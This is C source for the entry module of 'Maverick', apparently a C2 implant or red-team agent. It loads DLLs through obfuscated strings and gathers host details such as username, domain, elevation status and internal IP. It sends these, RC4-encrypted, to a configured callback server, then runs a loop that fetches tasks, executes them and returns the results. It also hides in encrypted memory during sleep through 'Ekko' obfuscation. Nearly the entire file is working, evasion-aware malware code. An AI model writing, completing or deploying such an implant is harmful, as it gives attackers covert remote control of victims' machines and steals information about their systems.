/*
 * Maverick — Entry Module
 *
 * This is the main agent logic, loaded as a PICO module by the Core PIC (main.c).
 * Handles initialization, checkin with the C2 server, and the main task loop.
 *
 * Flow:
 *   1. Free the Core PIC's original memory (we're running in the shared RWX region now)
 *   2. Load required DLLs (MSVCRT, ADVAPI32, WINHTTP)
 *   3. Initialize agent state (UUID, sleep, jitter, encryption key, callback config)
 *   4. Checkin loop — send host info to the server until registered
 *   5. Task loop — poll for tasks, dispatch to the task module, send results back
 *
 * All Win32 calls use DFR syntax (MODULE$Function) resolved by Crystal Palace.
 * Communication is encrypted with RC4 (16-byte key, generated at startup).
 */

#include <windows.h>
#include "includes/config.h"
#include "includes/packer.h"
#include "includes/crypto.h"

/* DFR declarations */
WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitThread(DWORD dwExitCode);
WINBASEAPI DECLSPEC_NORETURN VOID WINAPI KERNEL32$ExitProcess(UINT uExitCode);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(void);
WINBASEAPI VOID  WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
WINBASEAPI BOOL  WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
WINBASEAPI DWORD WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
WINBASEAPI UINT  WINAPI KERNEL32$GetACP(void);
WINBASEAPI UINT  WINAPI KERNEL32$GetOEMCP(void);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(void);
WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentThreadId(void);
WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
WINBASEAPI BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);

WINBASEAPI BOOL  WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
WINBASEAPI BOOL  WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINBASEAPI BOOL  WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);

WINBASEAPI NTSTATUS NTAPI NTDLL$RtlGetVersion(PRTL_OSVERSIONINFOW);

DECLSPEC_IMPORT void * __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void *);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memcpy(void *, const void *, size_t);
DECLSPEC_IMPORT void * __cdecl MSVCRT$memset(void *, int, size_t);
DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char *);
DECLSPEC_IMPORT void   __cdecl MSVCRT$srand(unsigned int);
DECLSPEC_IMPORT int    __cdecl MSVCRT$rand(void);

#ifdef MV_DEBUG
DECLSPEC_IMPORT int __cdecl MSVCRT$printf(const char *, ...);
DECLSPEC_IMPORT int __cdecl MSVCRT$fflush(void *);
#define DBG(fmt, ...) do { MSVCRT$printf("[MV] " fmt "\n", ##__VA_ARGS__); MSVCRT$fflush(NULL); } while(0)
#else
#define DBG(fmt, ...)
#endif

/* Function pointer types for PICO module entry points */
typedef char * (*TRANSPORT_FUNC)(char * host, int port, char * path, int ssl,
                                  char * body, int body_len, int * out_len);
typedef int    (*TASK_FUNC)(void * state, unsigned char * task_data, int data_len,
                             unsigned char ** result, int * result_len);
typedef void   (*OBFUSCATION_FUNC)(char * start_addr, int size, int time);

/* Agent state — holds all runtime configuration and connection info */
typedef struct {
    char uuid[37];
    char agent_id[37];
    unsigned char session_key[RC4_KEY_SIZE];
    int connected;
    int sleep_ms;
    int jitter;
    int exit_flag;
    int exit_method;
    TRANSPORT_FUNC transport;
    char callback_host[256];
    int  callback_port;
    char callback_uri[256];
    int  callback_ssl;
} MvState;

/*
 * Send an encrypted payload to the C2 server and receive the response.
 *
 * Wire format (send):  [36B agent_id][RC4(payload)][16B key (first checkin only)]
 * Wire format (recv):  [36B agent_id][RC4(response)]
 *
 * Returns 1 on success, 0 on failure. Response data is allocated and must be freed.
 */
static int transact(MvState *state, unsigned char *payload, int payload_len,
                    unsigned char **out_data, int *out_len) {
    *out_data = NULL;
    *out_len = 0;
    if (!state->transport) return 0;

    int enc_len = 0;
    unsigned char *enc_payload = rc4_encrypt(payload, payload_len, state->session_key, &enc_len);
    if (!enc_payload) return 0;

    /* Build wire frame: [36B id][encrypted data][optional 16B key] */
    int first_checkin = !state->connected;
    int body_len = 36 + enc_len + (first_checkin ? RC4_KEY_SIZE : 0);
    unsigned char *body = (unsigned char *)MSVCRT$malloc(body_len);
    if (!body) { MSVCRT$free(enc_payload); return 0; }

    MSVCRT$memcpy(body, state->uuid, 36);
    if (state->connected)
        MSVCRT$memcpy(body, state->agent_id, 36);
    MSVCRT$memcpy(body + 36, enc_payload, enc_len);
    if (first_checkin)
        MSVCRT$memcpy(body + 36 + enc_len, state->session_key, RC4_KEY_SIZE);
    MSVCRT$free(enc_payload);

    int resp_len = 0;
    char *resp_buf = state->transport(state->callback_host, state->callback_port,
                                      state->callback_uri, state->callback_ssl,
                                      (char *)body, body_len, &resp_len);
    MSVCRT$free(body);

    if (!resp_buf || resp_len <= 36) {
        MSVCRT$free(resp_buf);
        return (resp_buf != NULL) ? 1 : 0;
    }

    /* Strip 36B agent_id prefix and decrypt */
    int dec_len = 0;
    unsigned char *dec_resp = rc4_decrypt((unsigned char *)resp_buf + 36,
                                           resp_len - 36, state->session_key, &dec_len);
    MSVCRT$free(resp_buf);
    if (!dec_resp) return 0;

    *out_data = dec_resp;
    *out_len = dec_len;
    return 1;
}

/*
 * Build and send the checkin packet to register with the C2 server.
 *
 * Checkin packet format:
 *   [0xf1][36B UUID][0x64 arch][username][computer][domain][""][pid][tid]
 *   [imgpath][acp][oemcp][sleep_ms][jitter][internal_ip]
 *   [os_major][os_minor][os_build][elevated][session_key]
 *
 * On success, the server responds with an 8-byte agent ID (zero-padded to 36B).
 */
static int do_checkin(MvState *state) {
    /* Gather host information — all calls via DFR */
    char username[256]; MSVCRT$memset(username, 0, sizeof(username));
    DWORD uname_len = sizeof(username);
    ADVAPI32$GetUserNameA(username, &uname_len);

    char computer[256]; MSVCRT$memset(computer, 0, sizeof(computer));
    DWORD comp_len = sizeof(computer);
    KERNEL32$GetComputerNameA(computer, &comp_len);

    char domain[256]; MSVCRT$memset(domain, 0, sizeof(domain));
    char s_userdomain[] = {'U','S','E','R','D','O','M','A','I','N',0};
    KERNEL32$GetEnvironmentVariableA(s_userdomain, domain, sizeof(domain));

    DWORD pid = KERNEL32$GetCurrentProcessId();
    DWORD tid = KERNEL32$GetCurrentThreadId();

    char imgpath[260]; MSVCRT$memset(imgpath, 0, sizeof(imgpath));
    KERNEL32$GetModuleFileNameA(NULL, imgpath, 260);

    DWORD acp   = KERNEL32$GetACP();
    DWORD oemcp = KERNEL32$GetOEMCP();

    RTL_OSVERSIONINFOW osvi; MSVCRT$memset(&osvi, 0, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    NTDLL$RtlGetVersion(&osvi);

    /* Check if running elevated */
    int elevated = 0;
    {
        HANDLE hToken = NULL;
        if (ADVAPI32$OpenProcessToken((HANDLE)(LONG_PTR)-1, TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION te; MSVCRT$memset(&te, 0, sizeof(te));
            DWORD te_len = 0;
            if (ADVAPI32$GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &te_len))
                elevated = te.TokenIsElevated;
            KERNEL32$CloseHandle(hToken);
        }
    }

    /* Resolve internal IP via GetBestRoute2 (route to 8.8.8.8) — manual resolve since iphlpapi isn't a standard DFR module */
    ULONG internal_ip = 0;
    {
        char s_iphlpapi[] = {'i','p','h','l','p','a','p','i',0};
        HMODULE hIphlp = KERNEL32$LoadLibraryA(s_iphlpapi);
        typedef ULONG (WINAPI *fn_GetBestRoute2)(void*, ULONG, void*, void*, ULONG, void*, void*);
        char s_GetBestRoute2[] = {'G','e','t','B','e','s','t','R','o','u','t','e','2',0};
        fn_GetBestRoute2 pGetBestRoute2 = (fn_GetBestRoute2)KERNEL32$GetProcAddress(hIphlp, s_GetBestRoute2);
        if (pGetBestRoute2) {
            unsigned char dest[28]; MSVCRT$memset(dest, 0, sizeof(dest));
            *(unsigned short *)dest = 2;   /* AF_INET */
            dest[4] = 8; dest[5] = 8; dest[6] = 8; dest[7] = 8;  /* 8.8.8.8 */
            char bestRoute[128]; MSVCRT$memset(bestRoute, 0, sizeof(bestRoute));
            char bestSrc[28]; MSVCRT$memset(bestSrc, 0, sizeof(bestSrc));
            ULONG ret = pGetBestRoute2(NULL, 0, NULL, dest, 0, bestRoute, bestSrc);
            if (ret == 0) MSVCRT$memcpy(&internal_ip, bestSrc + 4, 4);
        }
    }

    /* Pack checkin data */
    PackBuf pb;
    pb_init(&pb);

    pb_byte(&pb, 0xf1);                                          /* checkin marker */
    pb_pad(&pb, (unsigned char *)state->uuid, 36);                /* agent UUID */
    pb_byte(&pb, 0x64);                                          /* arch: x64 */
    pb_bytes(&pb, (unsigned char *)username, (int)MSVCRT$strlen(username));
    pb_str(&pb, computer);
    pb_str(&pb, domain);
    pb_str(&pb, "");                                             /* reserved */
    pb_int32be(&pb, pid);
    pb_int32be(&pb, tid);
    pb_str(&pb, imgpath);
    pb_int32be(&pb, acp);
    pb_int32be(&pb, oemcp);
    pb_int32be(&pb, (unsigned int)(state->sleep_ms));
    pb_int32be(&pb, (unsigned int)(state->jitter));
    pb_int32be(&pb, internal_ip);
    pb_int32be(&pb, osvi.dwMajorVersion);
    pb_int32be(&pb, osvi.dwMinorVersion);
    pb_int32be(&pb, osvi.dwBuildNumber);
    pb_int32be(&pb, elevated);
    pb_bytes(&pb, state->session_key, RC4_KEY_SIZE);

    unsigned char *resp_data = NULL;
    int resp_len = 0;
    int ok = transact(state, pb.data, pb.len, &resp_data, &resp_len);
    MSVCRT$free(pb.data);

    if (!ok || !resp_data || resp_len < 8) {
        MSVCRT$free(resp_data);
        return 0;
    }

    /* Server returns 8-byte agent ID — zero-pad to 36 bytes */
    char new_id[9]; MSVCRT$memset(new_id, 0, sizeof(new_id));
    MSVCRT$memcpy(new_id, resp_data, 8);
    MSVCRT$free(resp_data);

    MSVCRT$memset(state->agent_id, '0', 36);
    state->agent_id[36] = '\0';
    MSVCRT$memcpy(state->agent_id, new_id, 8);

    state->connected = 1;
    return 1;
}

/*
 * go() — Maverick entry module main function.
 *
 * Called by the Core PIC after all modules are loaded into memory.
 *
 * Parameters:
 *   coreBase          — address of the Core PIC (freed immediately, we're in RWX now)
 *   moduleBase        — base address of the shared RWX module region (used by Ekko obfuscation)
 *   moduleSize        — total size of the module region
 *   transportModule   — entry point of the transport PICO (HTTP POST via WinHTTP)
 *   taskModule        — entry point of the task PICO (whoami/sleep/exit dispatch)
 *   obfuscationModule — entry point of the obfuscation PICO (Ekko sleep)
 */
void go(char * coreBase, char * moduleBase, int moduleSize, char * transportModule, char * taskModule, char * obfuscationModule) {
    /* Free the Core PIC — all code is now in the shared RWX region */
    KERNEL32$VirtualFree(coreBase, 0, MEM_RELEASE);

    /* Load required DLLs */
    char s_msvcrt[]   = {'M','S','V','C','R','T',0};
    char s_advapi32[] = {'A','D','V','A','P','I','3','2',0};
    char s_winhttp[]  = {'W','I','N','H','T','T','P',0};
    KERNEL32$LoadLibraryA(s_msvcrt);
    KERNEL32$LoadLibraryA(s_advapi32);
    KERNEL32$LoadLibraryA(s_winhttp);

    /* Resolve module entry points */
    TRANSPORT_FUNC    transportEntry   = (TRANSPORT_FUNC)transportModule;
    TASK_FUNC         taskEntry        = (TASK_FUNC)taskModule;
    OBFUSCATION_FUNC  obfuscationEntry = (OBFUSCATION_FUNC)obfuscationModule;

    /* Initialize agent state */
    MvState state;
    MSVCRT$memset(&state, 0, sizeof(state));

    {
        const char *src = MV_AGENT_UUID;
        int i = 0;
        while (src[i] && i < 36) { state.uuid[i] = src[i]; i++; }
        while (i < 36) { state.uuid[i] = '0'; i++; }
        state.uuid[36] = '\0';
    }

    state.sleep_ms = MV_SLEEP_TIME * 1000;
    state.jitter   = MV_JITTER;
    state.transport = transportEntry;

    {
        const char *h = MV_CALLBACK_HOST;
        int i = 0;
        while (h[i] && i < 255) { state.callback_host[i] = h[i]; i++; }
        state.callback_host[i] = '\0';
    }
    state.callback_port = MV_CALLBACK_PORT;
    {
        const char *u = MV_CALLBACK_URI;
        int i = 0;
        while (u[i] && i < 255) { state.callback_uri[i] = u[i]; i++; }
        state.callback_uri[i] = '\0';
    }
    state.callback_ssl = MV_CALLBACK_SSL;

    /* Generate random RC4 encryption key */
    MSVCRT$srand((unsigned int)KERNEL32$GetTickCount());
    for (int i = 0; i < RC4_KEY_SIZE; i++)
        state.session_key[i] = (unsigned char)(MSVCRT$rand() & 0xFF);

    DBG("Agent UUID: %s", state.uuid);
    DBG("Callback: %s:%d%s (ssl=%d)", state.callback_host, state.callback_port, state.callback_uri, state.callback_ssl);

    /* Checkin loop — retry with Ekko sleep on failure (max 10 attempts) */
    {
        int checkin_retries = 0;
        while (!state.connected && checkin_retries++ < 10) {
            DBG("Attempting checkin...");
            if (do_checkin(&state)) break;
            obfuscationEntry(moduleBase, moduleSize, state.sleep_ms);
        }
        if (!state.connected) {
            DBG("Checkin failed after 10 attempts - exiting");
            KERNEL32$ExitThread(0);
        }
    }

    DBG("Connected! Agent ID: %s", state.agent_id);

    /* Main task loop — poll server, dispatch commands, send results */
    while (!state.exit_flag) {
        int sleep_time = state.sleep_ms;
        if (state.jitter > 0) {
            int jitter_range = (sleep_time * state.jitter) / 100;
            if (jitter_range > 0)
                sleep_time += (MSVCRT$rand() % jitter_range);
        }

        /* Ekko obfuscation sleep — encrypts module memory while waiting */
        obfuscationEntry(moduleBase, moduleSize, sleep_time);

        PackBuf result_pb;
        pb_init(&result_pb);
        int has_results = 0;

        /* Request pending tasks from the server */
        unsigned char get_task = TASK_GET;
        unsigned char *resp_data = NULL;
        int resp_len = 0;
        int ok = transact(&state, &get_task, 1, &resp_data, &resp_len);

        if (ok && resp_data && resp_len > 0) {
            Parser p = { resp_data, 0, resp_len };
            unsigned char cmd_byte = parser_byte(&p);
            if (cmd_byte == 0x00) {
                unsigned int task_count = parser_int32le(&p);
                for (unsigned int t = 0; t < task_count; t++) {
                    int uid_len = 0;
                    unsigned char *uid_data = parser_str(&p, &uid_len);
                    if (!uid_data || uid_len < 8) continue;

                    char task_uid[256]; MSVCRT$memset(task_uid, 0, sizeof(task_uid));
                    int copy_len = uid_len < 255 ? uid_len : 255;
                    if (copy_len > 0 && uid_data[copy_len - 1] == 0) copy_len--;
                    MSVCRT$memcpy(task_uid, uid_data, copy_len);

                    unsigned int data_len = parser_int32le(&p);
                    unsigned char *task_data = NULL;
                    if (data_len > 0) task_data = parser_raw(&p, (int)data_len);
                    if (!task_data || data_len == 0) continue;

                    unsigned char *result = NULL;
                    int result_len = 0;
                    int command_id = taskEntry(&state, task_data, (int)data_len, &result, &result_len);

                    if (command_id > 0 && result && result_len > 0) {
                        unsigned char uid_pad[36];
                        MSVCRT$memset(uid_pad, '0', 36);
                        int uid_copy = (int)MSVCRT$strlen(task_uid);
                        if (uid_copy > 36) uid_copy = 36;
                        MSVCRT$memcpy(uid_pad, task_uid, uid_copy);

                        pb_pad(&result_pb, uid_pad, 36);
                        pb_int16be(&result_pb, (unsigned short)command_id);
                        pb_bytes(&result_pb, result, result_len);
                        has_results = 1;
                    }
                    MSVCRT$free(result);
                    if (state.exit_flag) break;
                }
            }
        }

        MSVCRT$free(resp_data);

        /* Send accumulated results back to the server */
        if (has_results) {
            int send_len = 1 + result_pb.len;
            unsigned char *send_buf = (unsigned char *)MSVCRT$malloc(send_len);
            if (!send_buf) { MSVCRT$free(result_pb.data); continue; }
            send_buf[0] = TASK_RESULT;
            MSVCRT$memcpy(send_buf + 1, result_pb.data, result_pb.len);

            unsigned char *discard = NULL;
            int discard_len = 0;
            transact(&state, send_buf, send_len, &discard, &discard_len);
            MSVCRT$free(discard);
            MSVCRT$free(send_buf);
        }

        MSVCRT$free(result_pb.data);
    }

    if (state.exit_method == 2) {
        KERNEL32$ExitProcess(0);
    }
    KERNEL32$ExitThread(0);
}
